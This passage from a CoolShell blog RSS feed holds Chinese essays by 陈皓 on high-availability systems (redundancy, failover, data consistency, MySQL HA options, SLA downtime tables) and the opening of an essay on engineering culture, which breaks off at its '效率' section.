<strong>专业的工具</strong>。这个时候，你就会发现，要做到高级别的SLA，比如包括5个9以上的SLA，人肉干活的能力已经完全跟不上了，你需要大量的专业的与之配套工具。<strong>人类之所以聪明是因为会发明工具，所以，这也是工业级的另一个标准——你有多少现代化的支撑工具？</strong>
</li>
</ul>
</li>
</ul>
<p>在之前的《<a href="https://coolshell.cn/articles/11656.html" target="_blank">开发团队的效率</a>》一文中，我说过——<strong>你总需要在一个环节上认真，这个环节越往前就越有效率，越往后你就越没效率</strong>。要么你设计和编码认真点，不然，你就得在测试上认真点。要是你设计、编码、测试都不认真，那你就得在运维上认真，就得在处理故障上认真。你总需要在一个地方认真。</p>
<p>认真是痛苦和艰难的，也是需要苦苦坚持的，因为人太容易妥协了，这对每个人来说都是一种不小的挑战。老实说，<strong>我与很多人对“认真”的标准不一样，所以，产生了很多分歧，很多人说我太理想了。其实，我能理解他们，一方面是因为我的标准是比较高了，另一方面是他们只做过民用级的软件。</strong></p>
<p>另外，在一开始，做惯了工业级软件的我极度地不适应于那些糙快猛的开发方式。不过，我也在调整自己，毕竟，世界不只一种价值观，有的是工业级的软件，有的则是民用级的，还有的只是个玩具，而且还有Java这门语言非常有效地屏蔽了很多底层和基础知识，所以，也不可一概而论，我也在适应一些民用级的软件开发的方式。</p>
<h4>后记</h4>
<p>从去年我从阿里离开到现在14个月了，这段时间内，我给大约40多家公司做过相应的技术咨询和解决过很多技术问题，绝大多数公司都是因为性能和稳定性的问题来找我的，我给这些公司解决问题的时候，基本都是这样的Pattern：</p>
<ul>
<li>一开始，发现都是一些技术知识点的问题，</li>
<li>然后，马上进入到系统架构方面方面的问题，</li>
<li>当再解决架构问题的时候，我发现，已经是软件工程的问题，</li>
<li>而软件工程问题的后面，又是公司管理上的问题</li>
<li>而公司管理的问题，结果又到了人的问题上</li>
<li>而人的问题，又到了公司文化的问题……</li>
</ul>
<p>你看，很多问题，一环扣一环，最终都不是一个简单的技术问题。我倒不是说，我在抱怨这些问题，我更不是在说能解决这些问题，因为，就像软件工程没有银弹一样，无论你给什么样的解决方案都会有问题，没有问题才是不科学的。我能做的是，观察这个公司的业务形态、和相关的思维方式，以及现有的资源和相应的技术实力，帮助他们从技术到管理上缓解或改善现有的问题。</p>
<p>所以，我基本上来说，这近20年来，<strong>我只在专心研究一个事——如何做出一个性能高稳定性好的大规模的系统。</strong>在这个方向中，除了很多的基础和底层技术我需要吃透，我还需要在软件的开发工艺，软件工具，以及软件的线上运维，以及相关的管理上不断学习和思考，<strong>因为，只有技术、工具、工程、运维、人员这几个方面搞好了，才可能出现一个性能高且稳定性好的系统</strong>。</p>
<p>之前对于我来说，我一直在鼓吹先进的管理和软件工程以及技术和工具。今天，对我来说，遇到最大的问题就是，在没有这些所谓的先进的东西的时候，除了我自己上手外，我是否还能解决相应的问题？因为我自己已经完全Scale不开了。</p>
<p>有问题就有挑战，我每天都在思考，如何在不完美甚至残缺的环境下，解决这些公司的技术问题。每个人都要给自己一个目标。目前，我给自己的目标是——<strong>在残缺的环境下，能让用户不改一行代码，不动任何的架构，不改变用户很糟糕的软件开发的习惯，也不让用户作任何管理上的调整，能提升用户的软件系统的性能和稳定性</strong>。</p>
<p>因为我相信技术，我相信有更好的技术，可以为用户完全透明的提升性能和稳定性，我大致找到了相应的解，现在，我正在实践的路上，这也许是笔大买卖，所以我不知天高地厚地注册了自己的公司……</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-08-18T18:55:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/17446.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 关于高可用的系统 ]]></title>
<link>https://coolshell.cn/articles/17459.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >在《<a href="https://coolshell.cn/articles/17446.html" target="_blank">这多年来我一直在钻研的技术</a>》这篇文章中，我讲述了一下，我这么多年来一直在关注的技术领域，其中我多次提到了工业级的软件，我还以为有很多人会问我怎么定义工业级？以及一个高可用性的软件系统应该要怎么干出来？这样我也可以顺理成章的写下这篇文章，但是没有人问，那么，我只好厚颜无耻的自己写下这篇文章了。哈哈。</p>
<p>另外，我在一些讨论高可用系统的地方看到大家只讨论各个公司的技术方案，<strong>其实，高可用的系统并不简单的是技术方案，一个高可用的系统其实还包括很多别的东西，所以，我觉得大家对高可用的系统了解的还不全面，为了让大家的认识更全面，所以，我写下这篇文章</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%90%86%E8%A7%A3%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F" title="理解高可用系统">理解高可用系统</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88" title="高可用系统的技术解决方案">高可用系统的技术解决方案</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E9%AB%98%E5%8F%AF%E7%94%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88%E7%9A%84%E7%A4%BA%E4%BE%8B" title="高可用技术方案的示例">高可用技术方案的示例</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7%E7%9A%84SLA%E7%9A%84%E5%AE%9A%E4%B9%89" title="高可用性的SLA的定义">高可用性的SLA的定义</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-5" href="#%E5%BD%B1%E5%93%8D%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E5%9B%A0%E7%B4%A0" title="影响高可用的因素">影响高可用的因素</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%97%A0%E8%AE%A1%E5%88%92%E7%9A%84%E5%AE%95%E6%9C%BA%E5%8E%9F%E5%9B%A0" title="无计划的宕机原因">无计划的宕机原因</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%9C%89%E8%AE%A1%E5%88%92%E7%9A%84%E5%AE%95%E6%9C%BA%E5%8E%9F%E5%9B%A0" title="有计划的宕机原因">有计划的宕机原因</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E7%9C%9F%E6%AD%A3%E5%86%B3%E5%AE%9A%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8E%9F%E5%9B%A0" title="真正决定高可用系统的本质原因">真正决定高可用系统的本质原因</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%90%86%E8%A7%A3%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F"></span>理解高可用系统<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们需要理解什么是高可用，英文叫High Availability（<a href="https://en.wikipedia.org/wiki/High_availability">Wikipedia词条</a>），基本上来说，就是要让我们的计算环境（包括软硬件）做到full-time的可用性。在设计上一般来说，需要做好如下的设计：</p>
<p><span id="more-17459"></span></p>
<ol>
<li>对软硬件的冗余，以消除单点故障。任何系统都会有一个或多个冗余系统做standby</li>
<li>对故障的检测和恢复。检测故障以及用备份的结点接管故障点。这也就是failover</li>
<li>需要很可靠的交汇点（CrossOver）。这是一些不容易冗余的结点，比如域名解析，负载均衡器等。</li>
</ol>
<p>听起似乎很简单吧，然而不是，细节之处全是魔鬼，冗余结点最大的难题就是对于有状态的结点的数据复制和数据一致性的保证（无状态结点的冗余相对比较简单）。冗余数据所带来的一致性问题是魔鬼中的魔鬼：</p>
<ul>
<li>如果系统的数据镜像到冗余结点是异步的，那么在failover的时候就会出现数据差异的情况。</li>
</ul>
<ul>
<li>如果系统在数据镜像到冗余结点是同步的，那么就会导致冗余结点越多性能越慢。</li>
</ul>
<p>所以，很多高可用系统都是在做各种取舍，这需要比对着业务的特点来的，比如银行账号的余额是一个状态型的数据，那么，冗余时就必需做到强一致性，再比如说，订单记录属于追加性的数据，那么在failover的时候，就可以到备机上进行追加，这样就比较简单了（阿里目前所谓的异地双活其实根本做不到状态型数据的双活）。</p>
<p>下面，总结一下高可用的设计原理：</p>
<ul>
<li>要做到数据不丢，就必需要持久化</li>
<li>要做到服务高可用，就必需要有备用（复本），无论是应用结点还是数据结点</li>
<li>要做到复制，就会有数据一致性的问题。</li>
<li>我们不可能做到100%的高可用，也就是说，我们能做到几个9个的SLA。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"></span>高可用系统的技术解决方案<span class="ez-toc-section-end"></span>
</h4>
<p>我在《<a href="https://coolshell.cn/articles/10910.html" target="_blank">分布式系统的事务处理</a>》中引用过下面这个图：这个图来自来自：Google App Engine的co-founder Ryan Barrett在2009年的Google I/O上的演讲《<a href="http://snarfed.org/transactions_across_datacenters_io.html" target="_blank">Transaction Across DataCenter</a>》（视频： <a title="阿里旺旺无法确定该链接的安全性" href="https://www.youtube.com/watch?v=srOgpXECblk" target="_blank">http://www.youtube.com/watch?v=srOgpXECblk</a>）</p>
<p><img alt="image placeholder" ></p>
<p>这个图基本上来说是目前高可用系统中能看得到的所有的解决方案的基础了。M/S、MM实现起来不难，但是会有很多问题，2PC的问题就是性能不行，而Paxos的问题就是太复杂，实现难度太大。</p>
<p>总结一下各个高可用方案的的问题：</p>
<ul>
<li>对于最终一致性来说，在宕机的情况下，会出现数据没有完全同步完成，会出现数据差异性。</li>
<li>对于强一致性来说，要么使用性能比较慢的<a href="https://en.wikipedia.org/wiki/X/Open_XA">XA系</a>的两阶段提交的方案，要么使用性能比较好，但是实现比较复杂的Paxos协议。</li>
</ul>
<p>注：这是软件方面的方案。当然，也可以使用造价比较高的硬件解决方案，不过本文不涉及硬件解决方案。</p>
<p>另外，现今开源软件中，很多缓存，消息中间件或数据库都有持久化和Replication的设计，从而也都有高可用解决方案，但是开源软件一般都没有比较高的SLA，所以，如果我们使用开源软件的话，需要注意这一点。</p>
<h4>
<span class="ez-toc-section" id="%E9%AB%98%E5%8F%AF%E7%94%A8%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88%E7%9A%84%E7%A4%BA%E4%BE%8B"></span>高可用技术方案的示例<span class="ez-toc-section-end"></span>
</h4>
<p>下面，我们来看一下MySQL的高可用的方案的SLA（下图下面红色的标识表示了这个方案有几个9）：</p>
<p><a href="http://www.slideshare.net/andrewjamesmorgan/mysql-high-availability-solutions-feb-2015-webinar"><img alt="image placeholder" ></a></p>
<p style="text-align: center;">图片来源：<a href="http://www.slideshare.net/andrewjamesmorgan/mysql-high-availability-solutions-feb-2015-webinar">MySQL High Availability Solutions</a></p>
<p>简单解释一下MySQL的这几个方案（主要是想表达一个越多的9就越复杂）</p>
<ul>
<li>MySQL Repleaction就是传统的异步数据同步或是半同步Semi-Sync（只要有一个slave收到更新就返回成功）这个方式本质上不到2个9。</li>
<li>MySQL Fabric简单来说就是数据分片下的M/S的读写分离模式。这个方案的的可用性可以达到99%</li>
<li>DRBD通过底层的磁盘同步技术来解决数据同步的问题，就是RAID 1——把两台以上的主机的硬盘镜像成一个。这个方案不到3个9</li>
<li>Solaris Clustering/Oracle VM ，这个机制监控了包括硬件、操作系统、网络和数据库。这个方案一般会伴随着节点间的“心跳机制”，而且还会动用到SAN（Storage Area Network）或是本地的分布式存储系统，还会动用虚拟化技术来做虚拟机的迁移以降低宕机时间的概率。这个解决方案完全就是一个“全栈式的解决方案”。这个方案接近4个9。</li>
<li>MySQL Cluster是官方的一个开源方案，其把MySQL的集群分成SQL Node 和Data Node，Data Node是一个自动化sharing和复制的集群NDB，为了更高的可用性，MySQL Cluster采用了“完全同步”的数据复制的机制来冗余数据结点。这个方案接近5个9。</li>
</ul>
<p>那么，这些2个9，3个9，4个9，5个9是什么意思呢？又是怎么来的呢？请往下看。</p>
<h4>
<span class="ez-toc-section" id="%E9%AB%98%E5%8F%AF%E7%94%A8%E6%80%A7%E7%9A%84SLA%E7%9A%84%E5%AE%9A%E4%B9%89"></span>高可用性的SLA的定义<span class="ez-toc-section-end"></span>
</h4>
<p><strong>上面那些都不是本文的重点，本文的重点现在开始，如何测量系统的高可用性</strong>。当然是SLA，全称<a href="https://en.wikipedia.org/wiki/Service-level_agreement" target="_blank">Service Level Agrement</a>，也就是有几个9的高可用性。</p>
<p>工业界有两种方法来测量SLA，</p>
<ul>
<li>一个是故障发生到恢复的时间</li>
<li>另一个是两次故障间的时间</li>
</ul>
<p>但大多数都采用第一种方法，也就是故障发生到恢复的时间，也就是服务不可用的时间，如下表所示：</p>
<table class="wikitable" align="center">
<tbody>
<tr>
<th>系统可用性%</th>
<th>宕机时间/年</th>
<th>宕机时间/月</th>
<th>宕机时间/周</th>
<th>宕机时间/天</th>
</tr>
<tr>
<td align="left">90% (1个9)</td>
<td>36.5 天</td>
<td>72 小时</td>
<td>16.8 小时</td>
<td>2.4 小时</td>
</tr>
<tr>
<td align="left">99% (2个9)</td>
<td>3.65 天</td>
<td>7.20 小时</td>
<td>1.68 小时</td>
<td>14.4 分</td>
</tr>
<tr>
<td align="left">99.9% (3个9)</td>
<td>8.76 小时</td>
<td>43.8 分</td>
<td>10.1 分钟</td>
<td>1.44 分</td>
</tr>
<tr>
<td align="left">99.99% (4个9)</td>
<td>52.56 分</td>
<td>4.38 分</td>
<td>1.01 分钟</td>
<td>8.66 秒</td>
</tr>
<tr>
<td align="left">99.999% (5个9)</td>
<td>5.26 分</td>
<td>25.9 秒</td>
<td>6.05 秒</td>
<td>0.87 秒</td>
</tr>
</tbody>
</table>
<p>比如，99.999%的可用性，一年只能有5分半钟的服务不可用。感觉很难做到吧。</p>
<p><strong>就算是3个9的可用性，一个月的宕机时间也只有40多分钟，看看那些设计和编码不认真的团队，把所有的期望寄托在人肉处理故障的运维团队， 一个故障就能处理1个多小时甚至2-3个小时，连个自动化的工具都没有，还好意思在官网上声明自己的SLA是3个9或是5个9，这不是欺骗大众吗？</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%BD%B1%E5%93%8D%E9%AB%98%E5%8F%AF%E7%94%A8%E7%9A%84%E5%9B%A0%E7%B4%A0"></span>影响高可用的因素<span class="ez-toc-section-end"></span>
</h4>
<p>老实说，我们很难计算我们设计的系统有多少的可用性，因为影响一个系统的因素实在是太多了，除了软件设计，还有硬件，还有每三方的服务（如电信联通的宽带SLA），当然包括“建筑施工队的挖掘机”。所以，正如SLA的定义，<strong>这不仅仅只是一个技术指标，而是一种服务提供商和用户之间的contract或契约</strong>。<strong>这种工业级的玩法，就像飞机一样，并不是把飞机造出来就好了，还有大量的无比专业的配套设施、工具、流程、管理和运营</strong>。</p>
<p>简而言之，SLA的几个9就是能持续提供可用服务的级别，不过，工业界中，会把服务不可用的因素分成两种：一种是有计划的，一种是无计划的。</p>
<h5>
<span class="ez-toc-section" id="%E6%97%A0%E8%AE%A1%E5%88%92%E7%9A%84%E5%AE%95%E6%9C%BA%E5%8E%9F%E5%9B%A0"></span>无计划的宕机原因<span class="ez-toc-section-end"></span>
</h5>
<p>下图来自Oracle的 《<a href="https://docs.oracle.com/cd/A91202_01/901_doc/rac.901/a89867/pshavdtl.htm">High Availability Concepts and Best Practices</a>》</p>
<p> </p>
<h5>
<span class="ez-toc-section" id="%E6%9C%89%E8%AE%A1%E5%88%92%E7%9A%84%E5%AE%95%E6%9C%BA%E5%8E%9F%E5%9B%A0"></span><img alt="image placeholder" >有计划的宕机原因<span class="ez-toc-section-end"></span>
</h5>
<p>下图来自Oracle的 《<a href="https://docs.oracle.com/cd/A91202_01/901_doc/rac.901/a89867/pshavdtl.htm">High Availability Concepts and Best Practices</a>》</p>
<p><img alt="image placeholder" ></p>
<p> </p>
<p>我们可以看到，上面的宕机原因包括如下：</p>
<p>无计划的</p>
<ul>
<li>系统级的故障 –  包括主机、操作系统、中间件、数据库、网络、电源以及外围设备</li>
<li>数据和中介的故障 – 包括人员误操作、硬盘故障、数据乱了</li>
<li>还有：自然灾害、人为破坏、以及供电问题。</li>
</ul>
<p>有计划的</p>
<ul>
<li>日常任务：备份，容量规划，用户和安全管理，后台批处理应用</li>
<li>运维相关：数据库维护、应用维护、中间件维护、操作系统维护、网络维护</li>
<li>升级相关：数据库、应用、中间件、操作系统、网络、包括硬件升级</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%9C%9F%E6%AD%A3%E5%86%B3%E5%AE%9A%E9%AB%98%E5%8F%AF%E7%94%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8E%9F%E5%9B%A0"></span>真正决定高可用系统的本质原因<span class="ez-toc-section-end"></span>
</h4>
<p>从上面这些会影响高可用的SLA的因素，你看到了什么？如果你还是只看到了技术方面或是软件设计的东西，那么你只看到了冰山一角。我们再仔细想一想，<strong>那个5个9的SLA在一年内只能是5分钟的不可用时间，5分钟啊，如果按一年只出1次故障，你也得在五分钟内恢复故障，让我们想想，这意味着什么？</strong></p>
<p><strong>如果你没有一套科学的牛逼的软件工程的管理，没有牛逼先进的自动化的运维工具，没有技术能力很牛逼的工程师团队，怎么可能出现高可用的系统啊</strong>。</p>
<p>是的，<strong>要干出高可用的系统，这TMD就是一套严谨科学的工程管理</strong>，其中包括但不限于了：</p>
<ul>
<li>软件的设计、编码、测试、上线和软件配置管理的水平</li>
<li>工程师的人员技能水平</li>
<li>运维的管理和技术水平</li>
<li>数据中心的运营管理水平</li>
<li>依赖于第三方服务的管理水平</li>
</ul>
<p>深层交的东西则是——对工程这门科学的尊重：</p>
<ul>
<li>对待技术的态度</li>
<li>一个公司的工程文化</li>
<li>领导者对工程的尊重</li>
</ul>
<p><strong>所以，以后有人在你面前提高可用，你要看的不是他的技术设计，而还要看看他们的工程能力，看看他们公司是否真正的尊重工程这门科学</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>有好些非技术甚至技术人员和我说过，做个APP做个网站，不就是找几个码农过来写写代码嘛。等系统不可用的时候，他们才会明白，要找技术能力比较强的人，但是，<strong>就算你和他们讲一万遍道理，他们也很难会明白写代码怎么就是一种工程了，而工程怎么就成了一门科学了。其实，很多做技术的人都不明白这个道理</strong>。</p>
<p>包括很多技术人员也永远不会理解，为什么要做好多像Code Review、自动化运维、自动化测试、持续集成之类这样很无聊的东西。就像我在《<a href="https://coolshell.cn/articles/11432.html" target="_blank">从Code Review 谈如何做技术</a>》中提到的，阿里很多的工程师，架构师/专家，甚至资深架构师都没有这个意识，当然，这不怪他们，因为经历决定思维方式，他们的经历的是民用级的系统，做的都是堆功能的工作，的确不需要。</p>
<p>看完这些，最后让我们都扪心自问一下，你还敢说你的系统是高可用的了么？ ;-)</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2016-08-21T12:34:53+08:00</pubDate>
<guid>https://coolshell.cn/articles/17459.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 什么是工程师文化？ ]]></title>
<link>https://coolshell.cn/articles/17497.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" > 四年前，我在QCon上演讲了一个《<a href="http://www.infoq.com/cn/presentations/Form-powerful-team" target="_blank">建一支强大的小团队</a>》（整理后的<a href="http://vdisk.weibo.com/s/gN-sQ/1351485199">PPT分享于这里</a>）提到了工程师文化，今天，我想在这里再写一篇关于工程师文化的文章，一方面是因为我又有了一些想法和体会，另一方面，因为我也正走在创业的道路，毫无疑问，要建一个有浓重的工程师文化的团队或公司，所以有必要把自己的相关想法形有成白底黑字的“字据”，以供打自己的脸——“要是未来没有做到，这篇文章就打我未来的脸” || “这篇文章太幼稚了，未来的我会打我现在的脸”，当然，如果要打脸，我希望是前者。</p>
<p>Again，<strong>这篇文章不是招人的贴子，因为我觉得，招聘第一重要的事，不是发招聘广告或是找猎头挖人，而是先得让自己变成一个能配得上真正工程师的公司，然后再谈吸引人的事</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96" title="为什么要工程师文化">为什么要工程师文化</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96%E7%9A%84%E7%89%B9%E5%BE%81" title="工程师文化的特征">工程师文化的特征</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%87%AA%E7%94%B1" title="自由">自由</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%95%88%E7%8E%87" title="效率">效率</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96%E5%A6%82%E4%BD%95%E8%90%BD%E5%9C%B0" title="工程师文化如何落地">工程师文化如何落地</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96"></span>为什么要工程师文化<span class="ez-toc-section-end"></span>
</h4>
<p>看看最近二十年来社会的发展，计算机和互联网已经渗透到了这个社会的每一个角落，各式各样的计算机技术成为了整个世界发展的强大引擎，各式各样的创新，无论是业务创新还是技术创新，都是依托于技术的快速演进，技术成了解放生产力提高社会运作的效率的中坚力量。以美帝为首的技术创新公司着着实实的改变着这个世界和人类的生活和生产习惯。</p>
<p><strong>今天，每个从事计算机行业的技术人员都应该感到幸运，因为，我们不但选对了行业，也出生在了正确的时代，可以感受到前所未有的刺激和变化，相比起我们的父辈，我们的人生，能经历这样的时代，实在是一种幸运。</strong>所以，选对了职业并出生在了正确的年代的我们，此时只需要思考的一个问题，那就是，我是否呆在了正确的地方用正确的方式做事？</p>
<p><span id="more-17497"></span></p>
<p>在我看来，这个世界上有三种商业公司，</p>
<ul>
<li>
<strong>运营或销售驱动型的公司</strong>。这类的公司以运营和营销见长，技术对于他们来说，更多的只是为了支持大规模的营销活动，以及成本上的控制，所以，基本上来说不太需要技术创新。这种公司最大的问题就是缺乏安全感。</li>
</ul>
<ul>
<li>
<strong>产品驱动型的公司</strong>。这类公司以产品见长，通过创造能提升用户生活体验的产品见长，技术对于他们来说，除了支持大规模的在线用户之外，他们会更多的去寻找那些为了增强用户体验，提高整个业务流程效率的技术创新。比如：UI的交互方面的，整个业务流程方面的。这种公司最大的问题，就是容易被别人模仿和抄袭。</li>
</ul>
<ul>
<li>
<strong>技术驱动型的公司</strong>。这类的公司相信技术能改变世界，他们更多的是用强大的工程技术来创造有颠覆性的东西，更多的是用各种自动化的技术取代人类。比如：近代的蒸汽机技术取代了大量的人工，数字技术取代了大量信息传递的人工，现代，这类公司还希望通过人工智能来取代愚蠢的人类来做决定。这种公司最大的问题就是可能做出叫好不叫座的东西。</li>
</ul>
<p>这三种公司都可能成功，也都有问题，但是，无一例外，他们都需要强大的技术支撑，只不过，他们把技术所放在的位置不一样。</p>
<p>无论你有多么的看不起技术人员，你都无法否认，你今天的生活相当的依赖这帮工程师，没有他们，你恐怕都不知道怎么生活了。邓爷爷几十年前就说过——“科学技术是第一生产力” ，无论什么样的科学技术的理论要落地都会依赖于工程技术有多先进。</p>
<p>所以，<strong>在今天，作为一个IT或互联网公司，“工程师文化”不是一个问题，而是一个常识</strong>！</p>
<h4>
<span class="ez-toc-section" id="%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96%E7%9A%84%E7%89%B9%E5%BE%81"></span>工程师文化的特征<span class="ez-toc-section-end"></span>
</h4>
<p>我下面罗列的这些特征，来源于：Google的《<a href="https://book.douban.com/subject/26582822/">重新定义公司</a>》，我在Amazon的工作经历，37Signals的《<a href="https://coolshell.cn/articles/9156.html" target="_blank">Rework</a>》，Quora上的 <a href="https://www.quora.com/What-makes-a-good-engineering-culture">What Makes Good Engineering Culture?</a>  Slideshare上的 <a href="http://www.slideshare.net/edmondlau/what-makes-a-great-engineering-culture">What Makes Good Engineering Culture</a>，以及我最近这半年来的一些实践。</p>
<p>简单说来，<strong>我可以简单的把这多的工程师文化的总结成两大类：“自由” 和 “效率”</strong>。</p>
<p>本来还应该有个“创新”，但我个人认为，<strong>创新的前提是——在自由的环境下对提高效率的痴迷，就一定会发生创新。</strong></p>
<p>创新不是凭空出现新的东西，其实，<strong>观察一下人类的发展史，不难发现，几乎所有的创新基本上跳出原来的思维模式用新的思维模式对原有问题的效率进行质的提升</strong>。比如：通信、交通、医疗、教育、生活……几乎全都是在优化效率。</p>
<p>所以，如果你的精神不自由，你很难跳出老的思维模式，你用老的思维模式你一定不会想到新的方法和方式，如果不是对效率的提升，这个创新可能会不接地气。</p>
<p>因此，我认为，工程师文化就是自由加效率！</p>
<h4>
<span class="ez-toc-section" id="%E8%87%AA%E7%94%B1"></span>自由<span class="ez-toc-section-end"></span>
</h4>
<p>首先，工程师文化意味的创新文化，工程师都是有创新冲动的人，因为手里有创造技能的人通常都会有想创造点什么的冲动。而创新的源泉水来源于精神的解放，精神自由才会引发各式各样的奇思怪想，才会有常人觉得不可能的疯狂想法和想像力，而这些想法和想像力导致了创新。</p>
<p>精神上的自由具体表现在：</p>
<ul>
<li>
<strong>自我驱动</strong>。自己管理自己是最好的管理。最失败的管理就是家长和保姆式的管理。兴趣出发的工作才可能迸发出真正的动力。</li>
</ul>
<ul>
<li>
<strong>灵活的工作时间和地点</strong>。工程师们更多的是脑力工作，而不是体力工作，工作上时间和地点的自由安排可以让工程师们的脑力工作更有效。Remote是一个很不错的工作方式，开源社区基本上都是这钟方式。和Remote有关的话题可参看37Signals的这本书《<a href="https://book.douban.com/subject/25861795/" target="_blank">Remote</a>》</li>
</ul>
<ul>
<li>
<strong>信息平等</strong>。这意味着，全体员工得到的是原始信息，而不是被管理者们层层加工消化后的信息，信息的屏蔽很容易造成误解和完全错误的行为。信息的平等，大的包括战略、方向、目标、财务，小的包括文档、代码、和知识的共享等。同样，也表现在意见表达上，任何人都有可能表达自己的意见和建议的平等机会，这样才会激发出更多的思路和思辩，从而有不同的更好的思路出现。而不是，大家都看到了问题，而没有人敢说。在Google除了代码全员共享，还有Thanks God, It’s Friday的文化，每周五，高管们会出来，任员工提各种尖锐的问题，在Amazon，代码和文档基本上全员开放，包括财务报表也对员工开放，另外，除了所有的NB的Principle SDE隔三岔五都会有一个Principle Talk（有很多Talk相当令人开脑洞），还有Amazon内部的Up the River文化，每年会选出一批公司最聪明最有想法的人集思会，讨公司下一步的和战略，并可以把相应的KPI直接按给Senior VP。</li>
</ul>
<ul>
<li>
<strong>不害怕错误</strong>。处理错误的正确的姿势是分析总结教训，而不是惩罚故障人。前者让人改善进步，后者让人萎缩不前。最大的错误就是不敢犯错，最大的问题就是不敢直面问题。</li>
</ul>
<ul>
<li>
<strong>宽松的审批系统甚至没有审批系统</strong>。审批通常暗示着三件事，1）对人的不完全信任，2）繁琐的流程，3）思维上的束缚。这些都是创新和想像力的天敌。一个公司的监管、审批、流程越重，这个公司的活力也就越差。</li>
</ul>
<ul>
<li>
<strong>20%的自由时间</strong>。这是Google公司提出来的，员工有20%自由的时间做自己想做的项目，Gmail就是这么出来的。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%95%88%E7%8E%87"></span>效率<span class="ez-toc-section-end"></span>
</h4>
